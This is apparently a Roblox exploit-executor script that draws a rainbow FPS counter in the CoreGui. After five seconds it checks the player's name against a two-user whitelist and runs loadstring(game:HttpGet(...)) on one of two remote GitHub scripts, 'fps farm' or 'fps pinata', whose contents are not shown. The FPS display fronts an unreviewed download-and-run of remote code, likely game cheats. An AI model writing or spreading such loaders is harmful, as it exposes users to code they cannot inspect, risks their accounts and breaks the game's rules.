local RunService = game:GetService("RunService")

local screenGui = Instance.new("ScreenGui")
local textLabel = Instance.new("TextLabel")

screenGui.Parent = game.CoreGui
screenGui.DisplayOrder = 100

textLabel.Parent = screenGui
textLabel.Size = UDim2.new(0, 200, 0, 30)
textLabel.Position = UDim2.new(0, 10, 0, 10)
textLabel.Font = Enum.Font.FredokaOne

textLabel.TextScaled = false
textLabel.TextSize = 18

textLabel.BackgroundTransparency = 1
textLabel.TextStrokeTransparency = 0

local function rainbowColor()
	local Dreamon = 0

	while true do
		Dreamon = Dreamon + 0.01

		if Dreamon > 1 then
			Dreamon = 0
		end

		textLabel.TextColor3 = Color3.fromHSV(Dreamon, 1, 1)

		RunService.RenderStepped:Wait()
	end
end

local frameCount = 0
local lastUpdate = tick()

RunService.RenderStepped:Connect(function()
	frameCount = frameCount + 1
	local now = tick()

	if now - lastUpdate >= 1 then
		local fps = frameCount / (now - lastUpdate)

		frameCount = 0
		lastUpdate = now

		textLabel.Text = string.format("FPS: %d", math.floor(fps))
	end
end)

spawn(rainbowColor)
wait(5)
local allowedUsers = {
    ["Letien3mbuZ"] = true,
    ["nhokpro2011"] = true,
}
local player = game.Players.LocalPlayer
if allowedUsers[player.Name] then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/SonNg20/pinata/refs/heads/main/fps%20farm"))()
else
    loadstring(game:HttpGet("https://raw.githubusercontent.com/SonNg20/pinata/refs/heads/main/fps%20pinata"))()
end
